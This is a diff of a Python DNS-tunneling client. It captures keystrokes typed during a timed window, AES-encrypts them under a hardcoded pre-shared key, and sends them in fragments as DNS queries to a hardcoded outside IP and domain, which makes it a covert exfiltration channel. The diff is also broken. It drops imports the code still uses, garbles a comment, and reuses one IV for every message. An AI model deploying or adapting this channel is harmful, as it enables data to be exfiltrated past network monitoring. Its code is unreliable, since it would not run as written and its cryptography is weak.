@@ -1,15 +1,14 @@
-import time
-import threading
-import sys
-import tty
-import termios
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 from scapy.all import *
-import base64
-import socket
-import select
+
+# Platform-specific imports for keystroke capturing
+if sys.platform == 'win32':
+    import msvcrt
+else:
+    import tty
+    import termios
 
 # Configuration
 DNS_SERVER_IP = '13.228.229.230'  # Replace with your DNS server IP
@@ -17,15 +16,14 @@ DNS_PORT = 53
 DOMAIN = 'sub.brightbuys.me'  # Replace with your target domain
 
 key_sent = False
-# First packet is always 1, k will mean it is a AES key    
-packet_number = 0  
+packet_number = 0  # First packet is always 1, k will mean it is an AES key
 
-
-# Pre-shared key (PSK) for exchanging the AES key securely
+# Pre-shared key (PSK) for exchangingpip in the AES key securely
 psk = b"thisisaverysecurekey123456789012"  # Must be 16, 24, or 32 bytes long
 
 # Placeholder for the user input
 user_input = ""
+
 
 # Function to capture user input for a specified duration (10 seconds)
 def capture_user_input(duration=10):
@@ -33,21 +31,29 @@ def capture_user_input(duration=10):
     user_input = ""  # Reset user input at the start of each capture
     print(f"You have {duration} seconds to type your message:")
 
-    # Set stdin to raw mode to capture each character immediately
-    fd = sys.stdin.fileno()
-    old_settings = termios.tcgetattr(fd)
-    tty.setraw(fd)
-
-    try:
+    if sys.platform == 'win32':
+        # Windows-specific input capturing
         end_time = time.time() + duration
         while time.time() < end_time:
-            if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
-                char = sys.stdin.read(1)
+            if msvcrt.kbhit():
+                char = msvcrt.getch().decode('utf-8')
                 if char:
                     user_input += char
-    finally:
-        # Restore the original terminal settings
-        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
+    else:
+        # Unix-based input capturing
+        fd = sys.stdin.fileno()
+        old_settings = termios.tcgetattr(fd)
+        tty.setraw(fd)
+        try:
+            end_time = time.time() + duration
+            while time.time() < end_time:
+                if sys.stdin in select.select([sys.stdin], [], [], 0)[0]:
+                    char = sys.stdin.read(1)
+                    if char:
+                        user_input += char
+        finally:
+            # Restore the original terminal settings
+            termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
 
     print("\nInput capturing complete.")
 
@@ -84,16 +90,16 @@ def decrypt_aes(data, key):
         print(f"[CLIENT] Decryption error: {e}")
         return None
 
-# TODO: CAN DO DIRECTLY IN THE CRAFT DNS QUERY :(
+
 def append_message(message):
     global key_sent
     global packet_number
-    
+
     # Craft message with packet number, "k" for first key fragment and no packet number for keys
     if key_sent is False:
         message = f"k:{message}"
         key_sent = True
-        
+
     elif packet_number == 0:
         message = f"k2:{message}"
         packet_number += 1
@@ -101,31 +107,26 @@ def append_message(message):
     else:
         message = f"{packet_number}:{message}"
         packet_number += 1
-        #TODO: ADD PACKET REFRESH
+        # TODO: ADD PACKET REFRESH
         if packet_number > 999:
             packet_number = 1
-        
-    return message    
+
+    return message
+
 
 # Fragment message to fit within DNS label size limits
-# 59 for now, -4 for the front IDs
 def fragment_message(message, max_label_length=59):
-    # Ensure the message is properly padded for base64
     missing_padding = len(message) % 4
     if missing_padding:
-        message += '=' * (4 - missing_padding)  # Add padding if necessary
+        message += '=' * (4 - missing_padding)
 
     fragments = []
     while message:
-        # Take the first `max_label_length` part of the message
         fragment = message[:max_label_length]
-        
-        # Append packet number at the beginning of the fragment
         fragment_with_number = append_message(fragment)
         fragments.append(fragment_with_number)
         message = message[max_label_length:]
 
-    # Logging each fragment
     print(f"[CLIENT] Total fragments created: {len(fragments)}")
     for i, fragment in enumerate(fragments):
         print(f"[CLIENT] Fragment {i + 1}: {fragment}")
@@ -134,7 +135,7 @@ def fragment_message(message, max_label_length=59):
 
 
 # Send DNS query based on the query type
-def send_dns_query(query_pkt, timeout=5):  # Increase timeout to 10 seconds
+def send_dns_query(query_pkt, timeout=5):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         sock.settimeout(timeout)
@@ -153,8 +154,8 @@ def decrypt_with_psk(encrypted_data, psk):
     try:
         print(f"[CLIENT] Encrypted data (base64) for AES key decryption: {encrypted_data}")
         data = base64.b64decode(encrypted_data)
-        iv = data[:16]  # Extract the IV (first 16 bytes)
-        encrypted_aes_key = data[16:]  # The rest is the encrypted AES key
+        iv = data[:16]
+        encrypted_aes_key = data[16:]
         cipher = AES.new(psk, AES.MODE_CBC, iv)
         decrypted_aes_key = unpad(cipher.decrypt(encrypted_aes_key), AES.block_size)
         print(f"[CLIENT] Decrypted AES Key: {decrypted_aes_key}")
@@ -169,16 +170,16 @@ def craft_dns_query(fragment, domain, query_type='TXT'):
     if not fragment:
         print("Error: Empty fragment, skipping query")
         return None
-    
+
     full_query_name = f"{fragment}.{domain}."
     print(f"Sending DNS Query: {full_query_name}")
     qtype_mapping = {'TXT': 16, 'CNAME': 5, 'A': 1}
     qtype_value = qtype_mapping.get(query_type, 16)
     dns_query = (
-            IP(dst=DNS_SERVER_IP) /
-            UDP(sport=RandShort(), dport=53) /
-            DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
-    ) 
+        IP(dst=DNS_SERVER_IP) /
+        UDP(sport=RandShort(), dport=53) /
+        DNS(rd=1, qd=DNSQR(qname=full_query_name, qtype=qtype_value))
+    )
     return dns_query
 
 
@@ -188,10 +189,24 @@ if __name__ == "__main__":
         sys.exit(1)
 
     query_type = sys.argv[1].upper()
+    
+    # Step 2: Generate AES key and IV for the session
+    aes_key = get_random_bytes(32)  # 32 bytes for AES-256
+    aes_iv = get_random_bytes(16)
 
-    # Run the input capture and message sending in a continuous loop
+    # Step 3: Encrypt the AES key using the PSK
+    encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)
+    encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)
+
+    # Step 4: Send the encrypted AES key as DNS queries
+    for fragment in encrypted_aes_key_fragments:
+        query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
+        print(f"[CLIENT] Sending AES key fragment: {fragment}")
+        send_dns_query(query_pkt)
+
+
     while True:
-        # Step 1: Capture user input for 10 seconds using a non-blocking approach
+        # Step 1: Capture user input for 10 seconds
         capture_thread = threading.Thread(target=capture_user_input, args=(10,))
         capture_thread.start()
         capture_thread.join()
@@ -201,20 +216,6 @@ if __name__ == "__main__":
             continue
 
         message_to_send = user_input.strip()
-
-        # Step 2: Generate AES key and IV for the session
-        aes_key = get_random_bytes(32)  # 32 bytes for AES-256
-        aes_iv = get_random_bytes(16)
-
-        # Step 3: Encrypt the AES key using the PSK
-        encrypted_aes_key = encrypt_with_psk(aes_key, psk, aes_iv)
-        encrypted_aes_key_fragments = fragment_message(encrypted_aes_key)
-
-        # Step 4: Send the encrypted AES key as DNS queries
-        for fragment in encrypted_aes_key_fragments:
-            query_pkt = craft_dns_query(fragment, DOMAIN, 'TXT')
-            print(f"[CLIENT] Sending AES key fragment: {fragment}")
-            send_dns_query(query_pkt)
 
         # Step 5: Encrypt the actual message using the AES key
         encrypted_message = encrypt_aes(message_to_send, aes_key, aes_iv)
